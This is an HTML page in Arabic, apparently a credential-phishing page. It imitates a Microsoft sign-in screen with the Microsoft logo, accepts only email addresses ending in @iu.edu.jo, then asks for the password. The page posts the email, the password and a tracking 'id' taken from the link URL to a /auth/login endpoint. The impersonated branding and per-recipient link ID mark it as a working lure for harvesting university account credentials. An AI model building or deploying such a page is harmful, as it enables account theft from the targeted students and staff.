<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, sans-serif;
      background: #f3f2f1;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 6px;
      width: 360px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #333;
      font-size: 18px;
      line-height: 1.4;
    }
    .input-group {
      position: relative;
      margin: 10px 0;
      text-align: left;
    }
    .form-control {
      width: 100%;
      padding: 12px 45px 12px 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      direction: ltr;
      box-sizing: border-box;
    }
    .input-icon {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      color: #666;
      font-size: 18px;
      pointer-events: none;
    }
    .btn {
      background: #0067b8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    .btn:hover {
      background: #005a9e;
    }
    .footer-link {
      margin-top: 15px;
      display: block;
      color: #0067b8;
      text-decoration: none;
      font-size: 14px;
    }
    .footer-link:hover {
      text-decoration: underline;
    }
    .error-msg {
      color: #a80000;
      font-size: 13px;
      text-align: left;
      margin-top: 5px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft Logo">
    <h2 id="title">تسجيل الدخول باستخدام بريدك الجامعي</h2>
    
    <!-- خطوة إدخال البريد -->
    <div id="step-email">
      <div class="input-group">
        <input type="email" id="email" class="form-control" placeholder="البريد الإلكتروني" required>
        <span class="input-icon">@</span>
      </div>
      <div id="emailError" class="error-msg">❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo</div>
      <button class="btn" onclick="validateEmail()">التالي</button>
    </div>
    
    <!-- خطوة إدخال كلمة المرور -->
    <form id="step-password" action="/auth/login" method="POST" style="display:none;">
      <div class="input-group">
        <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required>
        <span class="input-icon" onclick="togglePassword()">👁</span>
      </div>
      <input type="hidden" id="hiddenEmail" name="email">
      <input type="hidden" id="linkId" name="id">
      <button type="submit" class="btn">تسجيل الدخول</button>
      <a href="#" class="footer-link">هل نسيت كلمة المرور؟</a>
    </form>
  </div>

  <script>
    // تمرير ID الرابط ليصل للنموذج
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('id');
    if (linkId) {
      document.getElementById('linkId').value = linkId;
    }

    function validateEmail() {
      const emailInput = document.getElementById('email');
      const email = emailInput.value.trim();
      const errorDiv = document.getElementById('emailError');
      if (email.endsWith('@iu.edu.jo')) {
        document.getElementById('hiddenEmail').value = email;
        document.getElementById('step-email').style.display = 'none';
        document.getElementById('step-password').style.display = 'block';
        document.getElementById('title').innerText = email;
        errorDiv.style.display = 'none';
      } else {
        errorDiv.style.display = 'block';
      }
    }

    function togglePassword() {
      const p = document.getElementById('password');
      p.type = p.type === 'password' ? 'text' : 'password';
    }
  </script>
</body>
</html>
